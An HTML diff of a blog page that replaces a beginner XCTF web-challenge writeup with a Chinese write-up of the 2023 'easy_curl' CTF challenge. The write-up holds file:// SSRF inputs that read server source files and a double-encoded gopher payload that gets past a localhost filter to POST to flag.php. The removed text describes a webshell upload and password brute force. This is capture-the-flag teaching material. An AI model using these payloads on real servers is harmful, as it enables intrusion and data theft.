@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>攻防世界web新手区Writeup | 甜筒园</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="攻防世界web新手区Writeup | 甜筒园">
+  <title>2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl | 甜筒园</title>
+  <meta name="keywords" content=" SSRF漏洞 , gopher协议 ">
+  <meta name="description" content="2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="打开题目环境读取源码： dd题目源码：  var express &#x3D; require(&#39;express&#39;); var app &#x3D; express(); var fs &#x3D; require(&#39;fs&#39;); var path &#x3D; require(&#39;path&#39;); var http &#x3D; require(&#39;http&#39;); var pug &#x3D; re">
 <meta property="og:type" content="article">
@@ -439,9 +439,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-攻防世界web新手区" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-2023-03-15-2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">攻防世界web新手区Writeup</h1>
+        <h1 class="article-title">2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl</h1>
     
     <div class="article-meta">
         
@@ -456,15 +456,24 @@
         </span>
         
         
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color2">SSRF漏洞</a>
+            
+            <a class="color4">gopher协议</a>
+            
+        </span>
+        
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2023-03-07 16:47:35'>2022-01-16 18:17</time>
+            Created At : <time class="date" title='Updated At: 2023-03-24 18:54:11'>2023-03-15 17:45</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:967</span>
+        <span>Count:589</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -494,7 +503,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-view-source"><span class="toc-text">1.view_source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-robots"><span class="toc-text">2.robots</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-backup"><span class="toc-text">3.backup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-cookie"><span class="toc-text">4.cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-disabled-button"><span class="toc-text">5.disabled_button</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-weak-auth"><span class="toc-text">6.weak_auth</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-simple-php"><span class="toc-text">7.simple_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-get-post"><span class="toc-text">8.get_post</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-xff-referer"><span class="toc-text">9.xff_referer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-webshell"><span class="toc-text">10.webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-command-execution"><span class="toc-text">11.command_execution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-simple-js"><span class="toc-text">12.simple_js</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher%E5%8D%8F%E8%AE%AE%E7%9A%84GET%E5%92%8CPOST%E5%8D%8F%E8%AE%AE%E6%A0%BC%E5%BC%8F%EF%BC%9A"><span class="toc-text">gopher协议的GET和POST协议格式：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -510,121 +519,99 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a><strong>1.view_source</strong></h2><p>​	打开网址后发现界面是这样的：</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337257429804/c48ca26711041ce6b377a0befa6dcb3a652fd62e.png"></p>
-<p>尝试F12打开开发人员工具查看源代码：</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337266415701/4580b305547d1319884eb4f917e366b855c7ccaa.png"></p>
-<p>正好发现flag藏在这里，结束。</p>
-<hr>
-<h2 id="2-robots"><a href="#2-robots" class="headerlink" title="2.robots"></a>2.robots</h2><p>根据题目提示，尝试在url后添加<code>robots.txt</code></p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337270586804/41af69a2d2ca215fe4d5ebafe4a4ed058fbd3e72.png"></p>
-<p>发现flag藏在<code>f1ag_1s_h3re.php</code>中</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337274176910/66505fc87236a60b7c38486c98d899b6ea3208e2.png"></p>
-<p>END</p>
-<hr>
-<h2 id="3-backup"><a href="#3-backup" class="headerlink" title="3.backup"></a>3.backup</h2><p>题目提示是找到<code>index.php</code>的备份文件，百度查了一下如果网站存在备份文件，常见的备份文件后缀名有：“.git” ，“.svn”，“ .swp” ，“.~”，“.bak”，“.bash_history”，“.bkf”。 在URL后面，依次尝试输入常见的文件备份扩展名。<br>等到输入”.bak”时,弹出提示下载文件：</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337277251854/960900cc7106375ce18ad46c1ecd479a7acd5c2e.png"></p>
-<p>在文本中找到flag，下一个。</p>
-<hr>
-<h2 id="4-cookie"><a href="#4-cookie" class="headerlink" title="4.cookie"></a>4.cookie</h2><p>URL后加上<code>cookie.php</code>后</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337279665584/68420d03034b257110dba633dfeade3e5c00974e.png"></p>
-<p>用Burp Suite连接查看response</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337282095832/0c681ca1ddc74464d96a4d9972c0313a4c346a8d.png"></p>
-<p>找到flag，冲冲冲。</p>
-<hr>
-<h2 id="5-disabled-button"><a href="#5-disabled-button" class="headerlink" title="5.disabled_button"></a>5.disabled_button</h2><p>打开界面发现有个按钮按不下去，F12查看源代码，发现有一个<code>disabled</code>，双击选中删掉后，按一下flag就出来了。</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337284604808/0245a10357484c706bb99ab2381567b960ddb303.png"></p>
-<p>是不是很简单？</p>
-<hr>
-<h2 id="6-weak-auth"><a href="#6-weak-auth" class="headerlink" title="6.weak_auth"></a>6.weak_auth</h2><p>打开网址发现是一个登陆界面，随便输入用户名和密码后，提示我用户名为<code>admin</code>。试了多个万能密码后，都不对，看来只能用字典爆破了，题目说是随便设了个简单密码，假设为6位数字好了，<del>相信玄学</del>。</p>
-<p>用Burp Suite进行连接，在Raw界面下右键选择<code>Send to Intruder</code></p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337288478170/e982cd648b38cfa72ab429afd5335a31f0090c49.png"></p>
-<p>将密码位置处理成爆破点：</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337290502777/5a194cb5c60cffa5e6bd87a87c1a7a5220141b16.png"></p>
-<p>在这里修改爆破字典内容，然后点击<code>start attack</code>:</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337292904553/f56dcae28f1aa856a8619bed1b2085704f04a600.png" alt="image-20220116172329761"></p>
-<p>这里得跑一会了，不要着急</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337295816255/456acab6a5cff4ef9cedec6e1833608e59eca923.png" alt="image-20220116172655564"></p>
-<p> 从大到小排序后发现123456长度与别的不同，找到密码了。回到页面输入账号密码得到flag。</p>
-<hr>
-<h2 id="7-simple-php"><a href="#7-simple-php" class="headerlink" title="7.simple_php"></a>7.simple_php</h2><p>拿到题目后，根据php代码判断需要通过GET方式传入a和b的值，a要求等于0但不为0，b要求不能是数字还要大于1234，然后简单处理一下传入a和b的值就可以了</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643003998280754/8bbe82a308e586c6216c67f90bb45dea23994e66.png" alt="image-20220124135958020"></p>
-<p>bingo！</p>
-<hr>
-<h2 id="8-get-post"><a href="#8-get-post" class="headerlink" title="8.get_post"></a>8.get_post</h2><p>题如其名，就是考基本的get和post，get直接在url后添加就可</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643004410771707/2f5690c734d1401511e07fde43479f79b38fe6f4.png" alt="image-20220124140650625"></p>
-<p>post就需要postman来帮忙了<del><em>火狐的话直接post就好</em></del></p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643004515333934/a2d9c4e9f7fdfa49f5392dc2a4382543a2998218.png" alt="image-20220124140835207"></p>
-<hr>
-<h2 id="9-xff-referer"><a href="#9-xff-referer" class="headerlink" title="9.xff_referer"></a>9.xff_referer</h2><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643005782270065/c36aa1eb8084da1227115735c9ef2b5959e04a4d.png" alt="image-20220124142942126"></p>
-<p>话不多说，Burpsuite直连</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643005885218603/62a6553fca3bb2b928af859b0099ba4585b530bb.png" alt="image-20220124143125096"></p>
-<p>右键选择Send to Repeater</p>
-<p>这里添加一个X-Forwarded-For值为123.123.123.123</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006290936597/03ed8bb4b85a6e88d8298ee9ab853cbda3f66670.png" alt="image-20220124143810840"></p>
-<p>点击Go,查看相应里多了一行字</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006386292746/d3f008065aed3648868a4f1efa3cde270052d0aa.png" alt="image-20220124143946193"></p>
-<p>再添加个Referer值为<code>https://www.google.com</code></p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006462021974/5155af739e93260e367897dc4018263fd121a4e5.png" alt="image-20220124144101892"></p>
-<p>找到flag。</p>
-<hr>
-<h2 id="10-webshell"><a href="#10-webshell" class="headerlink" title="10.webshell"></a>10.webshell</h2><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006686797527/28bab5f4d1edcb0d29cafb41df65a8281c8cb69f.png" alt="image-20220124144446656"></p>
-<p>webshell就需要请出来菜刀来解决他了，先用post传一句话木马</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006788105981/a2b8ee1817303705cbb12c93e8978af82489e810.png" alt="image-20220124144627982"></p>
-<p>拿菜刀连一下</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006841616193/a741fdddeb9323ed77d6e671bf1fd3d79bd64377.png" alt="image-20220124144721522"></p>
-<p>有个flag文本，直接搞定</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006902853672/f2d823611f3de38e76c2b9747c8c68dafb2c2214.png" alt="image-20220124144822742"></p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006922808057/a3853337d6a36610c3aff59dd369f3c71129ca0d.png" alt="image-20220124144842696"></p>
-<hr>
-<h2 id="11-command-execution"><a href="#11-command-execution" class="headerlink" title="11.command_execution"></a>11.command_execution</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41617034/article/details/91837257">https://blog.csdn.net/qq_41617034/article/details/91837257</a></p>
-<p>参考这个博客学习一下有关命令执行的知识再来做题</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643007333604888/8e758e88b7c42f047127fa598afd7b6189030628.png" alt="image-20220124145533469"></p>
-<p>先试试本地地址127.0.0.1：</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643007387089454/1f4508231af64b14a349c24178dee9965b10e57c.png" alt="image-20220124145626953"></p>
-<p>已知flag在flag.txt中了，直接找一下</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643007655779380/dfe596a629d226c76b6ed163fb0e99918faf9061.png" alt="image-20220124150055685"></p>
-<p>注意斜杠后要有空格</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643007738427800/6d52014e9b3c92d07536f421ac1993af3e23c98e.png" alt="image-20220124150218330"></p>
-<p>找到目录</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643007805389534/29da258dc281f3b05b021c6de3698bb4fd14b583.png" alt="image-20220124150325273"></p>
-<p>搞定</p>
-<hr>
-<h2 id="12-simple-js"><a href="#12-simple-js" class="headerlink" title="12.simple_js"></a>12.simple_js</h2><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643009372440033/54c62e8f4c327c6e8600e6dac60768967b68418f.png" alt="image-20220124152932298"></p>
-<p>提示输入密码，随便试试，密码不对，F12查看源代码：</p>
-<pre><code class="javascript">
-    function dechiffre(pass_enc)&#123;
-        var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;;
-        var tab  = pass_enc.split(&#39;,&#39;);
-                var tab2 = pass.split(&#39;,&#39;);var i,j,k,l=0,m,n,o,p = &quot;&quot;;i = 0;j = tab.length;
-                        k = j + (l) + (n=0);
-                        n = tab2.length;
-                        for(i = (o=0); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += String.fromCharCode((o = tab2[i]));
-                                if(i == 5)break;&#125;
-                        for(i = (o=0); i &lt; (k = j = n); i++ )&#123;
-                        o = tab[i-l];
-                                if(i &gt; 5 &amp;&amp; i &lt; k-1)
-                                        p += String.fromCharCode((o = tab2[i]));
-                        &#125;
-        p += String.fromCharCode(tab2[17]);
-        pass = p;return pass;
-    &#125;
-    String[&quot;fromCharCode&quot;](dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;));
+        <p>打开题目只有一行字：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230324171848365.png" alt="image-20230324171848365"></p>
+<p>有一个传参点，试了一些路径都不行，看题目是easy_curl，尝试使用file协议读取文件：</p>
+<pre><code class="url">?url=file:///var/www/html/index.php
+?url=file:///var/www/html/flag.php
+</code></pre>
+<p>发现存在这两个文件，并读到源码：</p>
+<p><strong>index.php</strong></p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
 
-    h = window.prompt(&#39;Enter password&#39;);
-    alert( dechiffre(h) );
+if (!isset($_REQUEST[&#39;url&#39;]))&#123;
+    header(&quot;Location: /?url=_&quot;);
+    exit;
+&#125;
+
+$url=$_REQUEST[&#39;url&#39;];
+$x=parse_url($url);
+if($x[&#39;scheme&#39;]===&#39;gopher&#39;||$x[&#39;scheme&#39;]===&#39;file&#39;)&#123;
+    if(!preg_match(&#39;/localhost|127\.0\.|\。/i&#39;, $url))&#123;
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_exec($ch);
+        curl_close($ch);
+    &#125;
+    else&#123;
+        die(&#39;hacker&#39;);
+    &#125;
+&#125;
+else&#123;
+    die(&#39;are you serious？&#39;);
+&#125;
+?&gt;
 </code></pre>
-<p>代码审计一波，把16进制的</p>
-<pre><code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30
+<p><strong>flag.php</strong></p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+
+$flag=getenv(&quot;DASFLAG&quot;);
+$key = md5($flag);
+
+if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;
+    echo &quot;Just View From 127.0.0.1 \n&quot;;
+    echo &quot;\n&quot;;
+    echo $key;
+    return;
+&#125;
+
+if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;
+    echo $flag;
+    exit;
+&#125;
+?&gt;
 </code></pre>
-<p>转换为10进制</p>
-<pre><code>55,56,54,79,115,69,114,116,107,49,50
+<p>很明显这个题要我们利用SSRF漏洞，访问flag.php文件获得flag的MD5值，再利用gopher协议构造POST请求获取flag。</p>
+<h3 id="gopher协议的GET和POST协议格式："><a href="#gopher协议的GET和POST协议格式：" class="headerlink" title="gopher协议的GET和POST协议格式："></a>gopher协议的GET和POST协议格式：</h3><p>GET数据包只需要开头两行即可，例如：</p>
+<pre><code class="javascript">GET /test.php?a=Hello world HTTP/1.1
+Host: 127.0.0.1
 </code></pre>
-<p>转换为ASCII码</p>
-<pre><code>786OsErtk12
+<p>POST数据包需要五行，例如：</p>
+<pre><code class="javascript">POST /test.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+Connection: close            //这个可以没有，但是没有的话连接结束会延迟一段时间
+
+a=Hello world
 </code></pre>
-<p>根据题目提示flag格式为Cyberpeace{xxxxxxxxx}，提交Cyberpeace{786OsErtk12}得到正确答案。</p>
-<hr>
+<p>访问flag.php获取flag的MD5值：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230324180413866.png" alt="image-20230324180413866"></p>
+<pre><code class="md5">487707c46f8c478c1c0d0ee1b1a83aeb
+</code></pre>
+<p>构造POST请求：</p>
+<pre><code class="html">POST /flag.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+Connection: close
+
+key=487707c46f8c478c1c0d0ee1b1a83aeb
+</code></pre>
+<p>进行<code>url</code>二次转码，同时注意把%0a换成%0d%0a：</p>
+<pre><code class="url">POST%2520%252Fflag%252Ephp%2520HTTP%252F1%252E1%250D%250AHost%253A%2520127%252E0%252E0%252E1%250D%250AContent%252DType%253A%2520application%252Fx%252Dwww%252Dform%252Durlencoded%250D%250AContent%252DLength%253A%252036%250D%250AConnection%253A%2520close%250D%250A%250D%250Akey%253D487707c46f8c478c1c0d0ee1b1a83aeb%250D%250A
+</code></pre>
+<p>这里注意Content-Length的值必须正确，可以用<code>burpsuite</code>里的<code>Repeater</code>模块模拟发包一次，就会自动帮你算好Content-Length的值</p>
+<p>用gopher协议读一下：</p>
+<pre><code>index.php?url=gopher://0:80/_POST%2520%252Fflag%252Ephp%2520HTTP%252F1%252E1%250D%250AHost%253A%2520127%252E0%252E0%252E1%250D%250AContent%252DType%253A%2520application%252Fx%252Dwww%252Dform%252Durlencoded%250D%250AContent%252DLength%253A%252036%250D%250AConnection%253A%2520close%250D%250A%250D%250Akey%253D487707c46f8c478c1c0d0ee1b1a83aeb%250D%250A
+</code></pre>
+<p>因为<code>.</code>和<code>127.0.0.1</code>过滤了，这里用0就可以，另外注意gopher默认打的是70端口，需要添上80端口才能正常访问到<code>flag.php</code></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230324185253479.png" alt="image-20230324185253479"></p>
+<p>拿到flag。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
